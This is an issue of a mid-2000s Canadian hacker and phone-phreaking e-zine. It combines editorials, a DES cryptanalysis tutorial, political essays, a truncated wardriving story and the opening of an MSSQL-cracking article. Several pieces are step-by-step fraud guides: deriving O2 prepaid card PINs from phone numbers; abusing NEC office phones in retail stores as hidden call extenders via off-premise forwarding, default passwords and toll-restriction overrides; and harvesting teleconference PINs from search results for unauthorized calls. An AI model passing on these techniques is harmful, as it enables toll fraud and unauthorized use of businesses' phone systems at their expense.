 Introduction:

It was May 22nd 1999 and K-1ine magazine had survived its one month anniversary.
A new idea of mine had spawn out of bordem, and I felt it was time to test it out.
That idea was Nettwerked. The idea was that Nettwerked would, over time, act as
this country's top Internet phone phreaking resource. At this point Nettwerked was
nothing but a few low-tech hacking articles, some of my own hand scans, and a few
miscellaneous articles I wrote on telecom systems. It wasn't much but it definitely
was better than the unbearable "boxing" sites with ripped off articles from LOD
(Legion of Doom) technical journals. One thing I definitely didn't want was to
make Nettwerked one of those sites. They lacked originality, creativity, and quite
frankly A FUCKING CLUE about the current (POTS/VOIP) telephone networks.

Nettwerked soon grew with my own wacky and wild phreaking articles, and naturally
the outside contribution of phreaking articles to this site also grew. Before I
knew it Nettwerked filled itself with over 100 telecommunications related articles,
forty-something issues of K-1ine Magazine, Elcotel Research (an insanely large
research project into Elcotel-based COCOT Payphones) Flex Technology Research, a
popular discussion board, a monthly Nettwerked Meetings page, and a weekend Radio
Show.

It's been 6 years. This love child of mine, Nettwerked, has had its growing pains,
was nearly shut down after fears (see: paranoia) of a post-Bush New World Order
(thanks H410g3n for convincing me it was a bad idea), and has grown into a large
community of friends who share a common goal; learning as much as possible about
technology - at all costs. Thank you to everyone who have made this dream into a
reality. I look forward to sharing another 6 years and more with you all through
Nettwerked, K-1ine, Hack Canada, and any other Internet project/site that may
just happen to pop up in the future.

Remember though, all of this is only made possible by contribution. Without people
giving a shit Nettwerked would cease to exist. Contribute your original files
to Nettwerked/Hack Canada/K-1ine, contribute your original music to Nettwerked
Radio, discuss technology on the discussion board, come to our meetings, buy a
Voodoo Magick Box, link to the web-site. That is how *you* support our thriving
Canadian H/P scene!

Enjoy the Spring Issue of K-1ine (#47)... Six F*cking Years! Power to the people.

  Link of the Quarter:

  Every quarter I post one really great "link of the quarter" on each issue
  of K-1ine magazine. The link can be anything in the technology industry,
  music scene, rave scene, punk scene, or even a good article you read on
  a news site. I'll be taking submissions via e-mail or IRC right away; so
  get your links in and maybe you'll see it in the next issue of K-1ine!

  For the Spring 2005 issue of K-1ine, the link of the quarter is:

  http://www.phreakvidz.com

  Featuring full length telephone phreaking videos such as Kevin Poulsen on
  'Unsolved Mysteries', 'Central Office Tour Video', and lastly the Masters
  of Deception's 'Phiber Optik' in a documentary called 'Unauthorized Access'.

 780 Records Corporation... from the people who brought you Nettwerked Radio.

 780 Records Corporation is a 100% independent record label focused on helping
 independent, signed and unsigned artists get a voice. We are helping artists
 who produce music in various genres (punk, rock, electronic, etc.) sell and
 distribute their music to the global scene. At 780 Records Corporation believe
 strongly in an artists ability to make a living, and control their music. This
 is a challenging thing in a world where large music labels do the exact opposite.

 As a record label, we will promote your music, your cds, and more. Our contracts
 plan to be about freedom for the artist (unlike many of the large labels you see
 out there who control the lives of the artists), and about being heard. Nothing
 is more important to us than that. We have unofficially adopted Google's famous
 business slogan: "Don't be evil". We feel "Don't be evil" is not only an impor-
 tant part of business, but an important part of life in general.

 780 Records Corporation is also a supporter of 'Downhill Battle', a non-profit
 organization working to support participatory culture and build a fairer music
 industry. We plan to contribute free banner space, and donations to this very
 important organization who really do help independent artists across the globe.
 (Downhill Battle is available at: http://www.downhillbattle.org)

  Nettwerked.net: K-1ine magazine goes wheneverly


  [ For Immediate Release ]

  Thursday, May 12, 2005:

  -

  Edmonton, Alberta -- In a decision that is sure to make headlines; Nettwerked
  has announced that 'K-1ine', Canada's longest running hacker, phreak, electr-
  onics, and political magazine has been turned into one that will now be publ-
  ished wheneverly.

  In its beginning, K-1ine initially started out as a magazine that was released
  whenever its only editor and major writer, The Clone, had the time to piece the
  beautiful ascii art filled digital pages with everything that an underground
  publication should have.

  However, after approximately one year, K-1ine quickly grew into a magazine that
  had many contributing writers and artists, so The Clone decided that keeping
  K-1ine as a release that came out rarely certainly was not going to cut it for
  his readers.

  He wanted to have something that all HackCanada.com / Nettwerked.net visitors
  could look forward to once a month. So in July of 2000, K-1ine turned into a
  monthly release, and stayed that way until three years later in the summer of
  two-thousand and three when K-1ine went quarterly.

  And now it seems we have to go wheneverly. What does that mean? It means we'll
  release issues whenever we feel we have received an acceptable amount of article
  submissions. Why? Well in the past several months it has become increasingly
  difficult to gather enough high quality articles within a quarter to justify a
  K-1ine release. We feel this is the only way we can keep K-1ine from going under.

  Much like Phrack Magazine in the United States eventually did, K-1ine will most
  likely have 'zine issue releases once or twice a year after the Spring 2005,
  K-1ine #47 release.

  We hope with this more laid back approach to K-1ine, we can make K-1ine even
  more high quality, and of course more special. Starting after #47, K-1ine will
  follow the newly implemented wheneverly format, and will contain all the great
  articles and stories that you've grown to love from the magazine that changed
  the face of the Canadian hacking / phreaking scene forever. With the gathering
  of issues over a longer period of time, we hope this means K-1ine's wheneverly
  releases are much larger, and more elite than the previous quarterly issues.


  Upcoming Issues:

  * Whenever 200X: K-1ine 48

  * Whenever 200X: K-1ine 49

  * Whenever 200X: K-1ine 50 (50TH ANNIVERSARY ISSUE - promotional items included)


  Sincerely,

  The Clone (Editor-In-Chief)

[ O2 - PREPA1D CARD P1N PHREAK1N F0R THE MASSES ]

_____________ | ___ | | |___| O2 | |___________/

O2 can do ..



[ Intro ]
A few weeks ago i bought a new o2 ( o2-online.de ) prepaid
card. I deliberated if it is possible to get the pin from my phone-
number and i looked a while on my number and after a while
i saw something interesting.


[ Pin & phonenumber ]
I add the two last 3-digit numbers together and after this i
got a 4-digit number - my pin. Here is the simple turn:
( with a changed phonenumber just for example )

the number: 0176 12 424 754

add it: 424 + 754

the pin: 1178


[ Last words ]
I dont know if this is a coincidence but i dont beleave that.
Anyway the two 3-digit numbers, when you add them, must
become a 4-digit number so the range of numbers in this
case is minimal. O2 also have different numbers like 0179
and so on as prefix number with other different simple ways
maybe, i dont know.. phreak it out and change your pin. (-;


[ Greetings ]
Greetings are going out to Security-AG, Koksclan.de, sm0g23er,
Simoni, Jay-K, D-Nought and all my other good friends.

     Phreaking the NEC i-Series phone systems

     by war


The i-Series of desktop fones are manufactured by NEC. The
i-Series includes the 28i, 124i and 384i phones. These phones
were built by NEC for use in an office environment, and they
perform satisfactorily in that role. NEC i-Series phones are
used by a number of small and large businesses in North
America.

This article might, possibly, hopefully, give you some insight
into power-use (or phreaking, whatever) of the i-Series fones.
That's the idea, anways. I'm assuming a previous basic knowledge
of how PBX systems work.

The i-Series phones have quite a large array of features, too
large to explain every feature in detail in one article.

A quick overview of some of the i-Series features:

Alarm
Automated Attendent (Voice Announcer)
Background Music
Barge In (Emergency Interrupt-ish)
Call Forwarding
  Follow-me
  Off-Premise
  DND Override
Call Waiting/Camp On
Conferencing
  MeetMe Internal/External Conferencing
  MeetMe Internal/External Paging
Directory Dialing
Internal/External Paging
Programmable Function Keys
Soft Keys (on select models)
Reverse Voice Over
Room Monitoring
Tandem Trunking
Voice Mail


Physical Access

As the topic says, let's first assume you have physical access
to the actual phone. So, you may ask, "How do I gain physical access?"
It's not that hard, really. If you spot an i-Series phone in a shop,
you could simply ask them, "Can I use your phone?" It's not hard.

So. Let's look at a couple useful features of the wonderful i-Series
fone system.



Call Forwarding


Probably one of the most useful (in-my-opinion) options on the
i-Series phones is the "Call-Forwarding" feature and Call-Forwarding
Off-Premise feature. The i-Series phones have quite a few options
when it comes to call-forwarding. You can forward your calls to
voicemail, forward your calls to another extension, or forward to
an external number. Call-forwarding also ties in with the
Do-Not-Disturb (DND) functions of the phone.

Call-Forwarding

There are a couple call-forwarding modes. They are:

Call-Forwarding when Busy or Not-Answered

Call-Forwarding Immediate
  -immediately forwards your call using the given method
   without ringing the line at all

Call-Forwarding when Not Answered

Call-Forwarding Immediate with Both Ringing
  -immediately forwards your call using the given method, but still
   rings your line.

Call-Forwarding to Voice Mail


If you needed to active call-forwarding on a i-Series phone (once
again assuming physical access), simply dial:

1.	[*] + [2]

2.	Dial Call Forwarding condition:
	 1 - VoiceMail
	 2 - Busy or Not Answered
	 4 - Immediate
	 6 - Not Answered
	 7 - Immediate with Both Ringing
	 0 - Cancel Call-Forwarding

3.	Then dial the extension, Voice Mail master number, or
	simply press the [Voice Mail] programmable key (if there
	is one.)

4.	Dial Call Forwarding Type
	2 - All calls
	3 - Outside calls only
	4 - Intercom calls only


So, overall, if you wanted to say...forward all your calls
immediately to extension 555, you would dial:


[*][2] + [4] + [5][5][5] + [2] + hangup




Call-Forwarding Off-Premise


Call-Forwarding Off-Premise can be used to forward your calls to
another number. There are quite a few different ways to exploit
this feature, assuming local access at an i-Series fone.

To turn on Call-Forwarding Off-Premise, dial:


1. 	[*] + [2]

2. 	[6] + Dial line access code


{    Line access codes are:

[9]   Automatic Route Selection (ARS) / Trunk Group Routing
  Dialing "9" for an outside line is probably the most common
  way known by people using PBX systems to get an outside line.
  "9" is the extension commonly designated for Automatic Route
  Selection - the fone system chooses what line you are going
  to use for you.

[8][0][4] + Line Group (1-9 , 01-99, 001-128)
  804x dialing is Line Group Selection dialing. You can manually
  select the outgoing trunk group that you want your call to be
  placed via. For example, if there is more than one business at
  in your office, you might have a trunk group "1" for the "ABC
  Packaging Corp", and a trunk group "2" for the "BCD Shipping Co."
  If you were calling out using "9" on a phone belonging to the
  "BCD Shipping Co., you would be actualliny dialing "8042". That
  would route you onto the BCD Shipping Co. trunk group. But, you
  could also theoretically dial "8041" to make an outgoing call
  over the trunk group assigned to ABC Packaging. (I hope that
  makes sense).

[#][9]	+ Line Number Selection
  You can select an absolute line using "#9". You could dial
  "#9" + "05" to get line number 05.
}


3.	Then dial the external number where you want your calls
	to be forwarded.

4.	Hangup.




Call-Forwarding Off-Premises is a quick-n-dirty way to get an overnight
extender. If you were to walk up to a Future Shop employee, and ask them
to use their phone, you might be able to set it to Call-Forward
Off-Premises. But, chances are that it would be noticed the next day.

If you want to maximize the length of time before the Call-Forwarding is
removed, there are options to be considered.


Forward to the Operator.
  If you're forwarding to the operator, and then getting him/her to
  place the call, you aren't going to be endangering your favorite bridge
  or your friend.

Find a remote phone that rarely receives calls.
  In large retail outlets (Future Shop, Best Buy, Canadian Tire, etc)
  there are often departments that are lower traffic then others. For
  example, appliances. How many people go to Future Shop to buy
  appliances? None, you say? Well then, if you're going to pick a fone
  to set up as an extender, might I suggest you use a phone in the
  appliance department? Chances are, it's going to recive less traffic
  which means less chance of your extender getting taken down.

Forced Trunk Disconnection

While still on the physical access topic...Force Trunk Disconnection.
If for any unknown reason, you needed to release a line, simply dial up the
line using:

[#][9] + line number (ie 01, 02, 03, 005, whatever) + [*][3]

That will disconnect (read abruptly terminate) the connection. I'm sure
you can figure out a good use for that.



+++



Night Service Mode

Ever find a nice afterhours voicemail system that you just can't wait until
the evening to play with? Even if it means cutting off legitimate users? No,
me either. But, with Night Service Mode, you can do just that. Switching to
Night Service Mode during the daylight hours, especially in a busy store,
usually makes incoming callers upset. People calling in get voicemail.
And such. But, it's a convenient (for you) way in a pinch to get access to
an afterhours system. To physically turn on Night Service Mode from a phone,
just dial:

1. 	[8][1][8] + Night Service Password
  	  The default Night Service Password is "0000".

2. 	Dial the Night Service Mode
	  0	Day mode
	  1	Night mode
	  2	Midnight mode
	  3	Rest mode
	  4	Day 2 mode
	  5	Night 2 mode
	  6	Midnight 2 mode
	  7	Rest 2 mode

So, to turn on Night Service Night Mode during the day at your (least?)
favorite local Staples (or whatever uses i-Series) simply dial:

[8][1][8] + [0][0][0][0] + [1]

That is, of course, assuming the password is default.



+++


Outgoing Calls


Some i-Series phone systems have toll restrictions. To override toll
restrictions, simply dial:

[8][7][5] + Password

As well, some systems that use ARS (Automatic Route Selection) are
coded. Many larger companies like Nortel that have high volumes of
calling often code their PBX systems so that calls can be catalogued
effectively, and to discourage over-use and fraudulent use.

If the systems you are using is using coded ARS, when you dial "9",
you'll get a dialtone and can dial your number as normal. But, after
you have dialed the number, you will be dropped to another dialtone
and will have to enter the ARS code.


+++


Bridging and Social Engineering


Bridging is the act of placing two outside callers in a
conference call, and then dropping out of the call.

Let's say that two of your phreak buddies decide that they want to talk.
But, maybe they don't want to pay for it. Simple enough. You just walk
down to your local K-Mart, and find an remote phone. Then, wait for
one of your buddies to call up the local K-Mart's 800 number and ring your
phone. When he does, simply press the [Conf] button on your i-Series
phone. Then, wait for your second buddy to ring your line. When he does,
press [Conf] twice. This will connect the two parties. To drop out of the
conference and leave the two parties talking, simply press [HOLD] +
[#][8].

Now on the other side of the coin. Many companies set up tandem trunking
conferences to allow outside employees such as service technicians or
other field workers to talk to each other. You could social engineer an
secretary into creating a bridging line to talk on. If she doesn't know
how, now you can walk her through it, since you know. Many secretaries
also refer to bridging conferences as "Tandem Conferences", "Tandem Trunking
Lines", or something similar to that.

[  BlackRatchet wants to remind you that a 'Tandem Trunking Line' is not
  a technical term. A trunk and a line are different. Not the same. He
  really, REALLY wanted me to note that. So here it is. ]

That's about it.

After reading the original article by cybersk4nk, I knew I had to do a follow
up so here it is.


The Story:

I decide to start my adventure of the war walk in Starbucks that is located in
and beside Chapters in West Edmonton Mall. Sitting in the Starbucks gave me a
little time to get everything working and everything set up. So put my laptop
into my bag and off I went.


The Setup:

The laptop I was using for this WiFi scan was a IBM ThinkPad T21, running Free
BSD 5.3, Kismet 2005 01 R1, with a prism2.5 SMC2532W-B. The SMC2532W-B is a
200mW card, and let me tell you, this card packs a lot of power.

+-----------------------------------+


This is a continuation on my article "Dismantling DES" which appeared in
K-1ine #44, and I'll be making certain assumptions about the reader's
knowledge of the algorithm and cryptology vocabulary. 

When we left off from the first article, we made several sore assumptions:
thinking that the only noteworthy attribute of the key is its length, that
the existence of substitution boxes (s-boxes) is enough to guarantee their
security, and that multiple iterations alone fastens the resilience of the
algorithm. While we did explore the EFF project attacking DES's strength,
we rested with satisfaction that key brute forcing was the only effective
technique. In essence, we ignored any practical philosophies that crypt-
analysts might use in crypto-assault.


-------------------+
 Death to the Keys!|
-------------------+


First, let's examine the structure of keys in general. We can think of them
in similar fashion to passwords: how many tricks are there to securing your
password, and how many people actually use them? We have alphanumeric sugg-
estions, as well as case sensitivity using non-Roman characters, but there
are two harsh realities: people don't like remember complex globs of crap
when they just want to do their work (or play), and schools or companies
enforcing militant password regulations tend to have escrows of keys foll-
owing the same format (dictionary word + number is common). 

How does this relate to key structure in a crypto algorithm? Well, if you
are using keys composed of ASCII characters, there's usually a slim window
within which the key will be found. For example, if your keys are all letters
and numbers, you can set a brute-force analyzer to scan within the range of
0x30 and 0x7F. This alone eliminates nearly 30% of your spectrum. Second,
there are certain patterns in key structure that will probably not occur.
Would anyone prudently structure a key with repetitions like 0x5656565656?
Even interlacing key combinations like 0x1F2E3D4C5B probably won't occur.
The more ignorable patterns you can observe, the more efficient your key
scanner will be.


--------------------------+
 The "S" stands for "sexy"|
--------------------------+


Second, we have s-boxes.Before we run into analysis of s-box architecture,
we need to introduce the "avalanche" concept. When we think of cause-effect
situations, we think very directly. Because he has a car, he can drive to work.
If he has a job, he will be paid for his work. This extends to crypto-thought
in many ways: in a simple substitution cipher, if you change a single letter
so that plaintext "B" now becomes "D" instead of "R", every instance of R in
the ciphertext will change to D. However, a more secure algorithm would set
it so that if you change "B", both "D" becomes "R" AND "S" becomes "T". In
essence, we've changes things so that altering a single plaintext character
affects the outcome of multiple ciphertext characters. Rather than a cause-
effect ratio of 1:1 (1 cause : 1 effect), it becomes 1:2. According to aval-
anche philosophy, the greater the ratio (1:50, 1:500), the more difficult it
will be to deduct the plaintext with solely the ciphertext.

But how does this relate to s-box strength? Well, if you change the s-box
contents at all, how much will it affect the ultimate ciphertext you get?
For example, if your s-box contains a 4*6 grid of 1 through 20, like such:

+-----------+
|1  2  3  4 |
|5  6  7  8 |
|9  10 11 12|
|13 14 15 16|
|17 18 19 20|
|21 22 23 24|
+-----------+

it does absolutely nothing. If you reverse the order (start with 24, end with
1) it makes it slightly secure, but an amateur cryptanalyst should be able to
decode it. Introduce more elements (repeat numbers, use different sequences,
random number generators, etc) and the result gets more obfuscated. For
example, an s-box created by the Fibbonacci sequence will have a different
effect than one created by a random number generator. Moreso, different
randomness algorithms will have different effects.

But let's take it a step farther, incorporating the ratios: what if you change
two numbers and four in the ciphertext are changed? This makes reverse engine-
ering (trying to decipher the key through the cipher) far more difficult.
Better yet, say we formulate the s-boxes so that making a single bit change
in the plaintext changes -every- bit in the ciphertext? Now we can better
understand how the avalanche effect is seen in s-boxes. In thwarting expert
cryptanalysts, cycle iterations are far more useful when you have a well-
designed s-box with a significant avalanche effect.

Although we left them on a pale horse in the last article, s-box strength can
make or break a decent algorithm. However, our DES structure is still insecure.
Let's examine our current security elements: we have a key based on pseudo-
random characters, with little visible pattern and isolated ASCII characters;
our s-boxes, the heart of our system, is fastened with the most avalanche-
inducing number generator possible; but there's still something missing. Now
that we have pumped up the parts of a single cycle, we need to be concerned
with the iterations themselves. This is where we get into cipher block oper-
ation modes.


----------------------------+
 The Four Pillars of DEStiny|
----------------------------+


As we established in the first article, DES is a block cipher, meaning that
data is processed in blocks of data, rather than streamed through. For each
cycle, we have a chunk of plaintext, a generated chunk of key, and a general
operation mode that's performed on the entire body. There are four main modes:
Electronic Codebook (ECB), Cipher Block Chaining (CBC), Cipher Feedback (CFB),
and Output Feedback (OFB). ECB is the default mode we've been using so far,
amply named because, as each cycle uses a fresh plaintext input and key, mul-
tiple cycles essentially generate a "code book" where each chunk can be traced
to its ciphertext. Good for explanation, but dreadful for security.

CBC makes DES somewhat more secure. With CBC, the output ciphertext of the
cycle is xored with the input plaintext of the next cycle before the encryption
process occurs. Let's look at a diagram to illustrate this point:

-~+ CIPHER BLOCK CHAINING MODE +~-

Output        Input         Input  
from         current        next
previous       PT             PT
    |           |              |
    +---->------+ (xor)    +---+ (xor)
                |          |   |
          +------------+   | +--------+
          |    DES     |   | |next DES|
   key ->-|  encrypt   |   | | encrypt|
          +------------+   | +--------+
                |          |   |
             CT +-->-------+   +--next CT
                               

Of course, this picture assumes we're in the middle of multiple cycles. The
main point to remember is that the output from the previous cycle becomes
part of the input for the next. To clarify: if you're mixing meat and tomato
sauce, the output will be spaghetti sauce. The sauce then becomes input for
the pasta you've prepared, and the cooking algorithm creates an Italian
dinner :) The xoring process creates a link between the cycles, so that
instead of being able to use a plaintext/key chunk and have a corresponding
ciphertext, each subsequent cycle will change depending on the order. Thus,
instead of having a code book of cycles, we have a system that's chained
together, where each cycle is dependant on the others. Remember that aval-
anching concept? ;)

This makes the system more secure on a level parallel to a Vernam cipher.
CFB, on the other hand, takes the next step and applies a cycling shift
register scheme. To get an idea of how this works, let's first imagine
two wheels-- a large wheel and a small wheel-- rotating at the same speed.
If you draw a chalk mark on the edge of each wheel, you'll notice that as
they rotate, the chalk mark on the smaller wheel seems to rotate much more
quickly. This is because the mark on the big wheel has much more ground to
cover, and a single rotation of the small wheel doesn't provide enough time
for the big mark to finish.

Here's how this relates to CFB: we actually have -two- different operations
going on at the same time-- the typical shifting going on inside each cycle,
and an additional shift operation mixed with the cyclic xor that rotates a
small amount (let's say 8 bits) per cycle. Once again, a picture should help
clarify that jargon:

-~+ Cipher Feedback Mode +~-

Last Cycle           +--------------+      +-------+
      +              | Shift Reg    |      | Next  |
      |         +----| 64-8 | 8 bits|   +--| Cycle |
+------------+  |    +--------------+   |  +-------+
| Shift Reg  |  |           |           |
| 64-8|8bits |  |       +-----------+   |
+------------+  |  key--|  DES      |   |
      |         |       |  encrypt  |   |
(xor) +-->------+       +-----------+   ^
      |     CT              |           |
      PT             +--------------+   |
                     | Shift Reg    |   |CT
                     | 64-8 | 8 bits|   |
                     +--------------+   |
                            |           |(xor)
                            +-->--------+------<-----PT


The curious bits here involve the mysterious shift registers that have shown
up before and after the DES encryption, and the "8 bits" notes everywhere.
Let's watch a cycle. We draw input from the ciphertext of the previous cycle,
and the leftmost (most significant) 8 bits from the ciphertext are xored with
the first bit of plaintext. This is then shifted so that the xored bits become
the 8 rightmost bits, and the encryption continutes. When we get back to the
xoring with plaintext, we repeat the cycle of rotation until eventually all
bits have been xored. Therefore, the smaller wheel, the one whose mark rotates
faster, is the individual DES encryption within each cycle, while the larger
wheel consists of the ultimate xoring of plaintext and input ciphertext.

The final mode, OFB, is similar to the CFB mode, except that the ciphertext
from the cycle is output before the xoring process with the plaintext occurs.
This helps with parity, and assures that errors in tranmission don't continue
to the next cycle. However, because the xoring step is removed, it makes this
mode slightly more vulnerable.

Overall, there are many aspects of DES which, if focused on, could be made
much stronger. While there remain many criticisms, the basic techniques and
thought used for cryptanalysis in this article can easily be extended onto
other algorithms using similar concepts, and in general are useful for
understanding both composition of and deconstruction of cryptosystems.

Teleconferences. Confs.  What are they? Essentialy they are like party lines.
Dial them up, and a bunch of people might be on. Why would you want to do this?
For fun, or to make prank calls where multiple people can listen, or to trade
l33t codes or exchange ideas. You can also 3rd party bill with some, and you
can probibly even use it as a diverter point with modems. You can dial in from
one phone number, have your modem listen, then dial in from another point on the
planet and get your modem to connect to it. There are more uses for teleconfs,
but I'm sure most of them are obvious.

In the past, people beige boxed or used COCOTs to setup teleconferences. They
would dial one up, talk to the operator and tell them they would like to set up
a teleconference. The operator would ask them how they would like to pay for it.
The phreak would then say "I want to charge it to my number". The operator would
then ask for the number, and the phreak would give them the number of the COCOT
or the number of the pair they are beiging from. They would both hang up and the
operator would dial the number back to make sure that the number and the person
being charged is "legit". They would then be given 2 pins: the moderator pin and
the user pin. The user pin is what everyone uses and the moderator pin is what
the moderater uses (really hard to figgure out, eh?). The phreak would then share
his conf with other people who would then dial it up.

Ok, enough of what you probably already know. Here is the way we do it in the
year 2005 in three easy steps:

1) Go to google

2) Google the teleconference 800 number (Example: 1-800-315-6338).

3) Sift through the results for the PIN numbers and try them to see if they work.

I know many people have known about this and have been doing this for years now.
This isn't exactly new stuff, but I think there are a lot of people out there who
do not know about this stuff and would like to. I was doing this about a year and
a half ago and am finding more hits now than I did then, well, atleast hits with
pins that work anyways.

In a session of searching for conf pins that worked I found 3 different confs in
about an hour, and lots more results that I didnt bother to check. I mean, if you
have 3 conference numbers why would you need more? Why would you even need more
than one?

A few notes before I close up.

- I would highly recomend *NOT* using your home line for phoning confs. I have
heard stories of people being _RAIDED_ just because they phoned a conf from their
house. I don't know if this is true or not, but on the telephone bill they will
see all numbers that dialed the conf, this I am sure of.

- Try using other search engines besides google. You may find more results or
different results that google doesn't show.

- At night is the best time to conf/check pins because during the day there might
be legitamite conferences going on, and poping onto a conf and being like "WORD
UP MY FRIENDS!" and being greated by company executives is not only embarassing,
but also irresponsible because the company is more likey to investigate. In a post
9/11 world, you might even be accused of industrial espionoge and/or terrorism
because you phoned a conf and might have heard some executives say something
confidential.

- Try to see if you have moderator privlages and see if you can summon an operator.
They might be able to dial out for you.

- The conferences you will find will last until about the end of the month. Most
conferences that are set up are set to terminate at the end of the month. This is
also when the company gets their phone bill and sees all the fraudulant calls. So
if you need a conf number, the best time to get one is at the very beginning of
the month.

 The Inevitable Crash of Society 


Cybur Netiks (cybur_netiks@Phreaker.net) 


-=http://hackdaplanet.freespaces.com=- 


Hello, it's been a while since I wrote my last article, I have been busy,
and so is everybody else it seems. I have been busy on the ridiculous
number of projects I take on at once, but most people out there are busy
just trying to maintain life.

Now most people would think that it's not that bad, well look over your
bills and pay cheques over the last few years, unless you have had some
large promotion or sudden monetary gain over the past years, you will
probably see how much your cost of living has gone up and your income has
gone down. Now, why is this? Most people now adays simply blame it on
rising fuel costs, and while this is a big part of it, it is not the only
part of it. If you were to look back on history in very fine detail, you
may noticethat the very basis of our society has been the same for at least
2000 years. Don't believe me? What is at the base of our economy, not fuel,
not money, but people. People spend their whole lives working to put energy
towards keeping society alive for just one more day, every day you get up,
go to work, and lose more than half your earnings to the system.

Now, we do not know of anything that is perpetual, but society pushes on
with the illusion of being perpetual, but again, look back on history,
every so often, society crashes (the most recent one being the 1930's) and
after every crash comes a large event to start the motion all over again
(world war II, now I don't blame our governments for starting it, but it
was going to happen sooner or later) but again, the motion can only last
so long, then comes inflation, the energy supply will wear down while the
demand increases (decreased earnings, increased costs) until there is not
enough energy to power the motion, then it will crash and most likely be
started again.

This is a fairly simple scientific and mathematical concept (the following
is mostly just opinion). The US is trying something different now, they
see the crash coming and are trying to avoid it from happening by boosting
society now instead of after the crash, look on the news, they are picking
on new countries all the time, and even plan to invade some but never do,
it seems they are picking their fights, they are just picking on little
guys, building up resources desperately hoping to shelter themselves from
yet another crash. I can't tell you when society will crash, I am no math-
ematician, but I can say this, it will happen eventually, and the hardest
hit will not be the ones who have very little, but rather those who have
all them money in the world. If a man who expects to lose his house any
day now loses his house, it will come as little shock to him, and a man
who lives on the street will barely notice the difference but a man in a
upper scale riverside house who loses his well-paying job due to downsiz-
ing, he will be hit very hard and will be likely to have a breakdown or
even commit suicide the shock will be just too much for him to handle.

So the next time you see a man asking for change on a street corner, or
sorting through a trash can for a couple of bottles, don't shun him,
just think, he could not be more prepared for the crash of society.

----------------------
 IF I WERE PRESIDENT 
----------------------

(*)in my first term(*)

If I were president I would spearhead an initiative to buy back the Federal
Reserve for the initial investment cost that the purchase contract stipulates.
U.S. Currency would be tax free and tax dollars would no longer be spent re-
paying loans to the FED but appropriated to public works and reform projects.

If I were president I would cut back military spending and give grants to
start viable alternative fuel co-ops in fuels such as bio-diesel and Ethanol
/E-85. This would not only take power away from oil companies and free the
U.S. from oil dependence, it would also boost the economy by reviving the
dying U.S. farm industry.

If I were president I would issue an executive order to legalize marijuana
and the growing of hemp. (Hemp produces twice the paper per acre)

If I were president I would introduce a bill to congress that strictly
forbids the use of telivision advertisement to appeal to children that
includes stipulations about magazine and billboard advertisements as well.

If I were president I would introduce a bill to congress that forbids the
use of laws and initiatives such as the Digital Millenium Copyright act
and the Trusted Computing Platform which remove free information from the
public domain and hinder the development of open source technologies.

If I were president I would push for states rights. The United States of
America is just that, states united. The federal government is the coope-
ration of all states towards the greater good. It is not the rule of a
government over subserviant territories.

If I were president I would combat with a vengance the abuse of the legal
system committed by the MPAA and RIAA. I would fight to have copyright
infringement viewed as only a civil matter not a criminal matter. I would
also combat the use of inflated figures and the use of terms such as "lost
money" that infers that money was spent when in reality it wasn't made.

If I were president I would attempt to begin a program that studies herbal
medical alternatives and publishes findings to the public. All companies
that devote at least 30% of their production to herbal medicines would
enjoy a 25% tax cut.

If I were president I would disallow companies that have major holdings in
any market (or anyone who has large holdings in these companies) from don-
ating to a campaign for any public office.

If I were president I would permanently assign national guard units to
patrol the border between Mexico and the U.S. to alleviate the explosive
situation imposed by the Minuteman Militia currently patrolling the border.


(*)in my second term(*) @IF ELECTED@


If I were president I would commission a search of all classified documents
for human rights violations perpetrated by former leaders (President, Head
of the CIA, etc) against persons in other countries. If evidence is found
those who ordered the crime(s) will be deported and the evidence will be
turned over to courts in the countries in which the crime(s) was/were com-
mitted so that they may be prosecuted according to the law of the region
in which the crime was perpetrated.

If I were president I would define terrorism exactly as Merriam Webster
does.

If I were president I would issue an exuctive order nullifying all laws
which use indescisive language that results in whim laws. These are the
actions of a police state and cannot be tolerated in a nation based upon
freedom.

If I were president I would work with the patent office to further define
what can and cannot be patented and to what degree something can progress
towards human-like before it is unpatenable. Nothing found in nature
(especially human genes) can be patented and all patents already issued
that are found to be in violation would be revoked. It is a crime against
humanity to horde information pertinant to the understanding of the human
body for profit.

If I were president I would make FEMA subject to the same scrutiny as any
other branch of the government. Directors would be elected. Power would
be limited and the budget would be disclosed in full to the public.

If I were president I would extract all troops from foreign soil.

If I were president I would withdraw from the U.N. until such a time that
coercion tactics are ceased and nation to nation mediation can be carried
out properly.


A Word From The Author
______________________

The president should be a student of the constitution. A Man of the people.
The president cannot base his decisions upon religous bias or personal
favor. He must respect the constitution as it is the foundation of our
country.  Internal fraternization with corporations and abuse or neglect
of the law can no longer be tolerated. Nor can talk of globalization which
is a direct affront to sovereignty. We must fight back against the corpo-
litical tyranny attempting to enslave us all and return the nation to it's
roots in the Constitution.


Yours Truly,

DoobieEx

Disclaimer
----------

If you are going to be a stupid fuck and actually use this information for 
attempting criminal activities you’ll probably get caught.  I am releasing 
information that I have found, how you use it is your choice, and I am not 
responsible for your actions.

Foreword
--------

Most companies today rely more and more on the software giant Microsoft.  
Personally I hate Microsoft and I try to find every way to prove that they are 
inferior to open source software.  I have nothing against a company trying to 
make money but what MS is doing today is not simply trying to earn a profit, 
they are trying to monopolize the market!  

In saying that, this phile shows that Microsoft provides an insecure product 
to the consumer for a huge price.  Although in this phile I use Microsoft's 
own technology to break their SQL server I am still against MS and use this 
only as one solution to cracking a MSSQL server.

The tests that prove this phile correct were performed in a controlled 
environment and with the owner's permission.  OK think about it ... why would 
I not give myself the permission to do this?  The tests were performed on a 
P4 1.4Ghz with 512MB RAM running MSSQL Server 2003 and the remote system 
running the attack was a Centrino laptop with 256Mb RAM.  

I have also performed these tests in a medium sized business network.  The 
server was a dual Xeon running MSSQL 2003 and the users did not notice a large 
performance drop.  This attack is designed to be used from a PC on a 10/100 
internal network, and is not intended for remote internet use.

The source code provided has a bug where intermediately the network traffic 
will stop and wait for the ODBC connection to time out.  In a case where this 
lasts for many attempts simply stop the attack and resume.  I have found that 
the attack will work better if a successful ODBC connection is established 
before the attack is run.  This is very simple to do as I describe later in 
the phile.

Again as described in the disclaimer I am in no way responsible for your 
actions.  This information is provided here only for helping network and 
database administrators secure their own systems.  Do not in any way use this 
information for malicious purposes.

Again this attack is designed to work from an internal network.  It is best 
accomplished if a person has a domain login or a MSSQL username and password. 
Don't worry about the rights that the username that you have, we will upgrade 
them very soon.  In no way is this attack untraceable!!!! If you do use this 
attack in a malicious attack you WILL get caught and I will not write to you 
while you are in prison.

Ok enough of that.  Let's get to the good stuff.  In this phile I will do 
things a little different from previous philes.  I am adding an information 
section that will give you default information MSSQL server installs that 
should be removed.  Also I will be giving simple tips to secure your MSSQL 
server.  If you do not make these changes to your server will be vulnerable
